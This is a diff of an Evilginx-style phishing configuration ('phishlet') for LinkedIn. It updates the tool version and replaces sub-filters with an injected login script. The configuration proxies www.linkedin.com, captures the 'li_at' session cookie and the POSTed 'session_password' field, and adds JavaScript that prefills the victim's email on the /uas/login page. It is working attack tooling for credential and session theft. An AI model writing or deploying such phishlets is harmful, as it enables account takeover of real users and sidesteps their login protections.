@@ -1,11 +1,8 @@
 author: '@mrgretzky'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: '//{hostname}/nhome/', replace: '//{hostname}/nhome/', mimes: ['text/html', 'application/json']}
+sub_filters: []
 auth_tokens:
   - domain: '.www.linkedin.com'
     keys: ['li_at']
@@ -18,5 +15,22 @@ credentials:
     key: 'session_password'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/uas/login'
+login:
+  domain: 'www.linkedin.com'
+  path: '/uas/login'
+js_inject:
+  - trigger_domains: ["www.linkedin.com"]
+    trigger_paths: ["/uas/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
